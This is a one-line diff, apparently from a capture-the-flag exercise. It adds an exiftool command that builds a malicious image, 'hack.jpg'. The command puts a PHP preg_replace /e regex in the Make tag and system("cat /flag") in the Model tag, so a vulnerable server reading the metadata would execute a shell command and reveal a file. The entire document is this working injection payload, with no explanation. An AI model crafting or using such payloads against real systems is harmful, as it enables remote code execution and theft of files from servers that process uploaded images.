@@ -1,0 +1,1 @@
+'.\exiftool(-k)-12.73.exe' '-make=/(\d|)/e' '-model=system("cat /flag")' .\min.jpg -o .\hack.jpg
